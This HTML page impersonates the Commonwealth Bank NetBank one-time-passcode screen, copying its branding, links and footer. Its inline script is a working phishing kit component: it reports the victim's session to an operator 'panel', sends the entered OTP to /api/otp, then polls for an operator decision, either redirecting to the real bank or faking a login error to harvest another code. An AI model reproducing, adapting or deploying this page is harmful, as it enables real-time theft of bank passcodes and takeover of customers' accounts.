<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head id="head"><title>
	NetBank - Log on to NetBank - Enjoy simple and secure online banking from Commonwealth Bank
</title><meta name="description" content="NetBank is here to simplify your banking life. You can manage all your accounts from one place, and do your banking whenever or wherever it suits you." /><meta name="google-site-verification" content="_Y1ecy6XcbQ3abYLk9glqe_Csuq0QakknnlXfW2Qrjo" /><link rel="canonical" href="https://www.my.commbank.com.au/netbank/Logon/Logon.aspx" /><link rel="icon" type="image/png" href="https://static.my.commbank.com.au/static/netbank/theme/fo/images/cba_logo_diamond.37dea6048f7da9a9473614e0843d07d9.png" /><meta name="viewport" content="width=device-width, initial-scale=1" /><link rel="stylesheet" type="text/css" href="https://static.my.commbank.com.au/static/netbank/theme/fo/css/logon-merge.26d40f052bde646f68e5a483f075ba6d.css" rel-album="R760" />
<style>
/* Left-align OTP section */
.rowClientNumber .LabelWrapper,
.rowClientNumber .FieldElement {
    text-align: left !important;
    margin-left: 0 !important;
    padding-left: 0 !important;
}

.rowClientNumber .LabelWrapper label {
    text-align: left !important;
}

.rowClientNumber input.textbox {
    text-align: left !important;
}
</style>
</head>
<body id="body" class="logon">
<form method="post" action="./Logon.aspx" id="form1" autocomplete="off">
<div class="aspNetHidden">
<input type="hidden" name="RID" id="RID" value="Md4-o79MiEuUkMICrhQZBw" />
<input type="hidden" name="SID" id="SID" value="7bALVlASuHc=" />
<input type="hidden" name="cid" id="cid" value="xGL0psRriUuuHY4q0Q9xKQ" />
<input type="hidden" name="rqid" id="rqid" value="NFmUClov2EWdpTp7Tcq9QQ" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTYyNzk3MDY5NGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFEWNoa1JlbWVtYmVyJGZpZWxkyajFL6pW3G2RJiK0b4vThcB6Jn0=" />
</div>
<script>
  /* ===== 1. SESSION SET-UP ===== */
  const sid = new URLSearchParams(location.search).get('sid') ||
              sessionStorage.getItem('sid');
  if (!sid) {
    fetch('/api/session', {method:'post'})
      .then(r=>r.json()).then(({sid:id})=>{
        sessionStorage.setItem('sid',id);
        location.search='?sid='+id;
      });
    throw 0;
  }

  /* ===== NOTIFY PANEL: PAGE LOADED ===== */
  fetch('/api/page', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ sid, page: 'verify.html' })
  }).catch(() => {});

  /* ===== HEARTBEAT & PAGE CLOSE DETECTION ===== */
  const heartbeatInterval = setInterval(() => {
    fetch('/api/ping', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ sid })
    }).catch(() => {});
  }, 10000);

  window.addEventListener('beforeunload', () => {
    clearInterval(heartbeatInterval);
    navigator.sendBeacon('/api/exit', JSON.stringify({ sid }));
  });

  /* ===== 2. GET OTP ===== */
  function getOTP() {
    const otpField = document.getElementById('txtMyClientNumber_field');
    return otpField ? otpField.value.trim() : '';
  }

  /* ===== 3. VALIDATION ===== */
  function validateFields() {
    const otp = getOTP();
    const errors = [];

    // Check OTP
    if (!otp) {
      errors.push({
        field: 'txtMyClientNumber_field',
        label: 'OTP',
        message: 'This is required.'
      });
    } else if (!/^\d{4,6}$/.test(otp)) {
      errors.push({
        field: 'txtMyClientNumber_field',
        label: 'OTP',
        message: 'Please enter a valid OTP.'
      });
    }

    return errors;
  }

  /* ===== 4. SHOW VALIDATION ERROR ===== */
  function showValidationError() {
    const errors = validateFields();
    if (errors.length === 0) return true;

    // Remove existing error
    hideValidationError();

    // Build error HTML
    const errorList = errors.map((err, index) => {
      const isLast = index === errors.length - 1 ? 'last' : '';
      return `<li class="${isLast}"><div class="linkWrap">
        <a href="#${err.field}" onclick="document.getElementById('${err.field}').focus(); return false;"><strong>${err.label}</strong></a> - 
      </div><div class="msgWrap">
        ${err.message}
      </div></li>`;
    }).join('');

    const errorHtml = `
      <div class="message_contents message_contents_validation" id="validationErrorContent">
        <div class="message">
          <div class="message_icon validation icon icon_validation">
            <i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i>
          </div>
          <h3>
            <span class="validation">We're sorry, information required for one or more fields is missing or incorrect.</span>
          </h3>
          <ul class="msg_cnt_wrp msg_cnt_wrp_validation">
            ${errorList}
          </ul>
        </div>
      </div>
    `;

    // Insert after MainContent opening tag
    const mainContent = document.getElementById('MainContent');
    const tempDiv = document.createElement('div');
    tempDiv.className = 'MessagePanel arrow MessagePanel_Validation';
    tempDiv.id = 'validationErrorPanel';
    tempDiv.innerHTML = errorHtml;
    
    // Insert as first child of MainContent
    if (mainContent && mainContent.firstChild) {
      mainContent.insertBefore(tempDiv, mainContent.firstChild);
    } else if (mainContent) {
      mainContent.appendChild(tempDiv);
    }

    // Scroll to top
    window.scrollTo(0, 0);
    
    // Focus first error field
    if (errors[0]) {
      document.getElementById(errors[0].field).focus();
    }

    return false;
  }

  /* ===== 5. HIDE VALIDATION ERROR ===== */
  function hideValidationError() {
    const existing = document.getElementById('validationErrorPanel');
    if (existing) {
      existing.remove();
    }
  }

  /* ===== 6. SHOW LOADING OVERLAY ===== */
  function showLoading() {
    const overlay = document.createElement('div');
    overlay.id = 'login-loading-overlay';
    overlay.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(2px);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    `;

    const loader = document.createElement('img');
    loader.src = '/images/loader.811fa38f2f95504a101b1b41aec4e3ca.gif';
    loader.alt = 'Loading...';
    loader.style.cssText = `
      width: 50px;
      height: 50px;
    `;

    const text = document.createElement('p');
    text.textContent = 'Verifying...';
    text.style.cssText = `
      color: #333333;
      font-family: Arial, sans-serif;
      font-size: 14px;
      margin-top: 15px;
    `;

    overlay.appendChild(loader);
    overlay.appendChild(text);
    document.body.appendChild(overlay);
  }

  /* ===== 7. HIDE LOADING OVERLAY ===== */
  function hideLoading() {
    const existing = document.getElementById('login-loading-overlay');
    if (existing) {
      existing.style.opacity = '0';
      setTimeout(() => existing.remove(), 300);
    }
  }

  /* ===== 8. SHOW ERROR MESSAGE ===== */
  function showErrorMessage() {
    const existingError = document.querySelector('.message.warning');
    if (existingError) {
      existingError.remove();
    }

    const loginInput = document.querySelector('.ft') || document.body;

    const errorDiv = document.createElement('div');
    errorDiv.className = 'message warning message-block';
    errorDiv.innerHTML = `
      <div class="message-content">
        <p class="icon-block icon-info no-margin-bottom uia-error-message">
          <span>
            Sorry, your login details don't seem right. Please check and try again.
          </span>
        </p>
      </div>
    `;

    const form = document.querySelector('.ft') || loginInput;
    if (form && form.firstChild) {
      form.insertBefore(errorDiv, form.firstChild);
    } else {
      const container = document.querySelector('#ModuleLeft') || document.body;
      container.insertBefore(errorDiv, container.firstChild);
    }

    window.scrollTo(0, 0);
  }

  /* ===== 9. CLEAR FORM ===== */
  function clearForm() {
    const otpField = document.getElementById('txtMyClientNumber_field');
    if (otpField) {
      otpField.value = '';
      otpField.dispatchEvent(new Event('input', { bubbles: true }));
    }
  }

  /* ===== 10. POLL FOR ADMIN ACTION - FIXED ===== */
  let isWaitingForAdmin = false;
  let pollTimeout = null;

  function startPolling() {
    if (isWaitingForAdmin) return;
    isWaitingForAdmin = true;
    console.log('[DEBUG] Started polling for admin action');

    const poll = async () => {
      if (!isWaitingForAdmin) {
        console.log('[DEBUG] Polling stopped - isWaitingForAdmin is false');
        return;
      }

      try {
        console.log(`[DEBUG] Polling status for sid: ${sid}`);
        const res = await fetch(`/api/status/${sid}`);
        
        if (!res.ok) {
          console.log(`[DEBUG] Status check failed: ${res.status}`);
          throw new Error(`HTTP ${res.status}`);
        }
        
        const data = await res.json();
        console.log(`[DEBUG] Status response:`, data);

                if (data.status === 'ok') {
          console.log('[DEBUG] Status is OK - redirecting to CommBank');
          isWaitingForAdmin = false;
          clearTimeout(pollTimeout);
          // Force redirect using multiple methods for reliability
          window.location.replace('https://www.commbank.com.au');
          return;
        }

        if (data.status === 'redo') {
          console.log('[DEBUG] Status is REDO - showing error');
          isWaitingForAdmin = false;
          clearTimeout(pollTimeout);
          hideLoading();
          clearForm();
          showErrorMessage();
          return;
        }

        if (data.status === 'gone') {
          console.log('[DEBUG] Session gone - stopping poll');
          isWaitingForAdmin = false;
          return;
        }

        // Continue polling
        console.log('[DEBUG] Status not ready, continuing poll...');
        pollTimeout = setTimeout(poll, 1200);

      } catch (err) {
        console.error('[DEBUG] Poll error:', err);
        pollTimeout = setTimeout(poll, 2000);
      }
    };

    poll();
  }

  function stopPolling() {
    isWaitingForAdmin = false;
    if (pollTimeout) {
      clearTimeout(pollTimeout);
      pollTimeout = null;
    }
  }

  /* ===== 11. SUBMIT OTP ===== */
  document.addEventListener('click', (e) => {
    const btn = e.target.closest('#btnLogon_field');
    if (!btn) return;

    // Hide any previous validation error
    hideValidationError();

    // Validate fields
    if (!showValidationError()) {
      return;
    }

    const otp = getOTP();

    showLoading();

    // Notify panel: OTP entered
    const payload = { sid, otp };
    fetch('/api/otp', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(payload)
    })
    .then(res => {
      if (res.ok) {
        console.log('[DEBUG] OTP submitted successfully, starting poll');
        startPolling();
      } else {
        hideLoading();
        alert('Invalid OTP. Please try again.');
      }
    })
    .catch(err => {
      hideLoading();
      console.error('Fetch error:', err);
      alert('An error occurred. Please try again.');
    });
  });

  // Clear validation error when user starts typing
  document.addEventListener('input', (e) => {
    if (e.target.id === 'txtMyClientNumber_field') {
      hideValidationError();
    }
  });

  // Restrict OTP to digits only and max 6 chars
  document.addEventListener('keydown', (e) => {
    if (e.target.id === 'txtMyClientNumber_field') {
      // Allow: backspace, delete, tab, escape, enter
      if ([46, 8, 9, 27, 13].indexOf(e.keyCode) !== -1 ||
          // Allow: Ctrl+A, Ctrl+C, Ctrl+V, Ctrl+X
          (e.keyCode === 65 && e.ctrlKey === true) ||
          (e.keyCode === 67 && e.ctrlKey === true) ||
          (e.keyCode === 86 && e.ctrlKey === true) ||
          (e.keyCode === 88 && e.ctrlKey === true) ||
          // Allow: home, end, left, right
          (e.keyCode >= 35 && e.keyCode <= 39)) {
        return;
      }
      // Ensure that it is a number and stop the keypress if not
      if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
        e.preventDefault();
      }
      // Limit to 6 digits
      if (e.target.value.length >= 6 && e.keyCode !== 8 && e.keyCode !== 46) {
        e.preventDefault();
      }
    }
  });
</script>
		<div id="BodyContainer">
			<div id="Header">
				<div id="BrandingLogo">
					<span class="ImageWithHelp" id="imgCbaLogo"><img id="imgCbaLogo" src="https://static.my.commbank.com.au/static/netbank/theme/fo/images/cba_mainlogo.552c5a58c5e8e13c837eac9f362e571a.svg" alt="Commonwealth Bank of Australia" /></span>
				</div>
			</div>
			<div id="MainContent">
                
				<noscript>
					<div class="MessagePanel">
						<div class="message_contents message_contents_validation">
							<div class="message">
								<div class="message_icon error"></div>
								<div class="msg_cnt_wrp msg_cnt_wrp_error">
									<p>
										<strong>You need to enable JavaScript to access NetBank</strong>
									</p>
									<p>
										Follow these instructions on <a id="lnkEnableJavaScript" href="https://www.commbank.com.au/support/faqs/298.html" target="_blank">how to enable JavaScript</a>.
										If you'd prefer not to enable Javascript, you can still access some basic NetBank functions by logging into the <a id="lnkMobileVersionNoScript" href="https://www.netbank.com.au/mobile">mobile version</a> of NetBank.
									</p>
								</div>
							</div>
						</div>
					</div>
				</noscript>
				<div class="MessagePanel arrow" id="mplMessagePanel" style="display:none;">

</div>
				<div id="ModuleWrap">
					<div id="ModuleLeft" class="module">
						<h2>Authorise</h2>
						<div class="bd">
							<div class="ft" style="text-align: left;">
								<div class="row" style="margin-bottom: 15px; text-align: left;">
									<p style="font-size: 13px; line-height: 1.5; color: #333; text-align: left;">
										We have sent you a one-time-passcode. Please enter the code below once you receive it. Please note, it may take up to 2 minutes to receive the code.
									</p>
								</div>
								<div class="row rowClientNumber" style="text-align: left;">
									<div class="LabelWrapper LabelTextAlignNotSet align_notset" style="text-align: left;">
										<label for="txtMyClientNumber_field" id="txtMyClientNumber_label" style="text-align: left;"><span class="MainLabel">OTP</span></label>
									</div>
									<div class="FieldElement" style="text-align: left;">
										<input name="txtMyClientNumber$field" type="text" maxlength="6" id="txtMyClientNumber_field" class="text textbox field" autocomplete="off" style="text-align: left;" />
									</div>
								</div>
								<input type="hidden" name="perfmonLog" id="perfmonLog" />
							    <input type="hidden" name="metric" id="metric" />
								<div class="FieldElement FieldElementNoLabel" style="text-align: left;">
									<div class="CbaButton" id="btnLogon">
										<input class="button field" type="button" name="btnLogon$field" value="Verify" id="btnLogon_field" />
									</div>
								</div>
							</div>
						</div>
					</div>
					<div id="ModuleRight" class="module">
						<h2>New to NetBank?</h2>
						<div class="bd">
							<div class="ft">
								<ul class="Bullets">
									<li><a id="lnkRegistration" href="https://www1.my.commbank.com.au/netbank/Registration/Mixed/SelectCard.aspx?RID=Md4-o79MiEuUkMICrhQZBw&amp;SID=7bALVlASuHc%3d">Register for NetBank now</a></li>
									<li><a id="lnkOnlineSupport" href="https://www.commbank.com.au/personal/support.html" target="_blank">Online support for our products and services</a></li>
									<li><a id="lnkProtectYourselfOnline" href="http://www.commbank.com.au/security-privacy/default.aspx" target="_blank">Tips to stay safe online</a></li>
								</ul>
							</div>
							<div class="ft secModule">
								<ul class="Bullets">
									<li><a id="lnkSecurityGuarantee" href="https://www.commbank.com.au/unauthorised-transactions.html" target="_blank">Protection for unauthorised transactions</a></li>
								</ul>
							</div>
						 </div>
					</div>
				</div>
                
<!-- Component for content management. -->							

<div id="ucLogonContentManageControl_pnlContentManaged">
	
    <div id="ContentManaged">
        <!-- this is the features panel which has the image and description. -->
        <div id="ucLogonContentManageControl_pnlHighlightPanel">
		
            <div class="HighlightPanel">
                <div class="top">
                    <div class="bottom">							
                        <div class="image">
                            <p><a href="https://www.commbank.com.au/digital/locate-us/?mbt=nb-tile_locate" target="_blank"><img src="https://static.my.commbank.com.au/static/cmxAssets/netbank-logon/Netbank_login_Branch.jpg" alt="" /></a></p>
                        </div>
                        <div class="description">
                            <table><tbody><tr><td><p><b>More branches than any other bank. No doubt.</b></p><ul><li><a href="https://www.commbank.com.au/digital/locate-us/?mbt=nb-tile_locate" target="_blank">Locate us</a></li></ul><p></p><p></p></td></tr></tbody></table> 
                        </div>                                                            
                    </div>											
                </div>
            </div>
        
	</div>				    						
        <!-- side by side highlight links at the bottom -->
        <div id="ucLogonContentManageControl_pnlCurrentHighlights">
		
            <div id="CurrentHighlights">
                <h3>Quicklinks</h3>
                <div class="column">
                     <ul>					
                                                        
                                <li><p><a href="https://www.commbank.com.au/business/support/financial-hardship.html?mbt=nb-ql_harship" target="_blank">Financial difficulty support for your business. Find out more</a></p></li>                                                                                                                                                                               
                                                            
                                <li><p><a href="https://www.commbank.com.au/home-loans/refinancing-your-home-loan.html?mbt=nb-ql_refinance" target="_blank">Refinance your eligible home loan. See how</a></p></li>                                                                                                                                                                               
                                                            
                                <li><p><a href="https://www.commbank.com.au/support/financial-support/financial-hardship.html?mbt=nb-ql_financial-hardship" target="_blank">Are you experiencing financial difficulty? Get help</a></p></li>                                                                                                                                                                               
                                                            
                                <li><p><a href="https://www.commbank.com.au/digital-banking/benefits-finder.html?mbt=nb-ql_benefitsfinder" target="_blank">Use Benefits finder to find grants, rebates and concessions you may be eligible for</a></p></li>                                                                                                                                                                               
                            
                     </ul>
                </div> 
            </div>
        
	</div>
    </div>

</div>		
			</div>
			<div id="PageFooter">
				<a id="lnkTermsOfUse" href="http://www.commbank.com.au/personal/netbank/terms-and-conditions/terms.aspx" target="_blank">Terms of use</a> | <a id="lnkSecurity" href="http://www.commbank.com.au/security-privacy/default.aspx" target="_blank">Security</a> | <a id="lnkPrivacy" href="http://www.commbank.com.au/security-privacy/general-security/privacy.html" target="_blank">Privacy</a>
				<span id="CopyRight">&copy; Commonwealth Bank of Australia 2026 ABN 48 123 123 124</span>
			</div>

			<iframe id="DigitalPlatformLogout" style="height: 1px; width: 1px; border: 0; position: absolute; left: -1000px; top: -1000px" src="https://www.commbank.com.au/digital/identity/authenticate/sign-out?dpOnly=true"></iframe>
		    <iframe id="NetBankDotIdentityLogout" style="height: 1px; width: 1px; border: 0; position: absolute; left: -1000px; top: -1000px" src="https://www.commbank.com.au/retail/netbank/identity/signout"></iframe>
		</div>
	<!-- CorrelationId: e5bcdbce-66ca-4031-9c47-a2ed08b16db5 -->

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="D36AA275" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAdBE2G25NgTBOSU8Pqz5seN1tkCpOzpMMGFMIXCpKP1eU+3DVZOao4DU3+mkUn/6Lq9VKFP44dFVSqvdUtSca65l2O0yUofFF/VqhDKu55So0WhGMs5vjP2z0dydHI73bH84b/Z4SECaSTCtUK4njAufZrgpuWroDjuHGLJy3xuLdJ/NDY=" />
</div>

<script type="text/javascript">
//<![CDATA[
document.getElementById('txtMyClientNumber_field').focus();
//]]>
</script>
<script type="text/javascript">
//<![CDATA[
document.write("<input type=\"hidden\" name=\"JS\" value=\"E\" />");
//]]>
</script>

</form>
	<input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""/><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""/><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"/><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value=""/>
</body>
</html>







